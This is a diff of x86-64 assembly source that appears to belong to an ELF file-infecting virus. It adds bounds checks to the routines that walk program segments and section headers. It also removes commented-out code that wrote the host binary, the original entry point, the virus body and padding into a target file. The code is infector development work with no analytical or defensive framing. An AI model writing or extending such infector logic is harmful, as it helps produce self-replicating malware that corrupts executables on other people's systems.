@@ -67,6 +67,10 @@ _treat_all_segments:
 	mov r10, QWORD [rsp + 56] ; while phnum < ehdr->e_phnum
 	cmp QWORD [rsp + 48], r10
 	jge _init_treat_all_sections
+	mov r10, QWORD [rsp + 32]
+	sub r10, QWORD [rsp]
+	cmp r10, QWORD [rsp + 8]
+	jge _munmap
 
 _if:
 	cmp QWORD [rsp + 64], 0 ; if found
@@ -141,6 +145,10 @@ _treat_all_sections:
 	mov r10, QWORD [rsp + 48]
 	cmp r10, QWORD [rsp + 56] ; while (shnum < ehdr->e_shnum)
 	jge _init_mmap_tmp
+	mov r10, QWORD [rsp + 40]
+	sub r10, QWORD [rsp]
+	cmp r10, QWORD [rsp + 8]
+	jge _munmap
 
 _if_offset_equal_virus_offset:
 	xor r10, r10
@@ -251,88 +259,6 @@ _write_into_file:
 	mov rdx, QWORD [rsp + 8] 
 	add rdx, 4096
 	syscall
-;	mov QWORD [rsp + 96], 0
-;	mov QWORD [rsp + 104], 0
-
-;_loop:
-;	mov rdi, QWORD [rsp + 96]
-;	cmp rdi, QWORD [rsp + 88]
-;	jge _last_write
-;	mov rdi, QWORD [rsp + 108] ; fd
-;	mov rsi, rsp; buff
-;	add rsi, 104
-;	mov rdx, 1; size
-;	syscall
-;	inc QWORD [rsp + 96]
-;	jmp _loop
-
-;_write_in_fd:
-;	mov r10, QWORD [rsp] ; add PAGESIZE to sections offset
-;	add r10, 40
-;	add QWORD [r10], 4096
-;; write(fd, map, virus_offset);
-;	mov rax, 1
-;	mov rdi, QWORD [rsp + 24] ; fd
-;;	mov rdi, 1
-;	mov rsi, QWORD [rsp] ; buff
-;	mov rdx, QWORD [rsp + 72] ; size
-;	syscall
-;; write(fd, o_entry, 8);
-;	mov rax, 1
-;	mov rdi, QWORD [rsp + 24] ; fd
-;;	mov rdi, 1
-;	mov rsi, rsp ; buff
-;	add rsi, 80
-;	mov rdx, 8 ; size
-;	syscall
-;; write(fd, virus, virus_size);
-;	mov rax, 1
-;	mov rdi, QWORD [rsp + 24] ; fd
-;;	mov rdi, 1
-;	lea rsi, [rel _string] ; buff
-;	mov rdx, QWORD [rsp + 16] ; size
-;	syscall
-;;;;; just for debug
-;;	mov rax, 1
-;;	mov rdi, 1 ; fd
-;;	mov rsi, rsp ; buff
-;;	add rsi, 72
-;;	mov rdx, 8 ; size
-;;	syscall
-;; for i < 4096 - (virus_size + 8) write(fd, &(0), 1);
-;	mov QWORD [rsp + 88], 4096
-;	mov rdi, QWORD [rsp + 16]
-;	add rdi, 8
-;;	mov rdi, 1
-;	sub QWORD [rsp + 88], rdi
-;	mov QWORD [rsp + 96], 0
-;	mov QWORD [rsp + 104], 0
-;
-;_loop:
-;	mov rdi, QWORD [rsp + 96]
-;	cmp rdi, QWORD [rsp + 88]
-;	jge _last_write
-;	mov rax, 1
-;	mov rdi, QWORD [rsp + 24] ; fd
-;;	mov rdi, 1
-;	mov rsi, rsp; buff
-;	add rsi, 104
-;	mov rdx, 1; size
-;	syscall
-;	inc QWORD [rsp + 96]
-;	jmp _loop
-;
-;_last_write:
-;	mov rax, 1
-;	mov rdi, QWORD [rsp + 24] ; fd
-;;	mov rdi, 1
-;	mov rsi, QWORD [rsp] ; buff
-;	add rsi, QWORD [rsp + 72]
-;	mov rdx, QWORD [rsp + 8] ; size
-;	sub rdx, QWORD [rsp + 16]
-;	sub rdx, 8
-;	sub rdx, QWORD [rsp + 72]
-;	syscall
 
 _munmap:
 	mov rax, 11
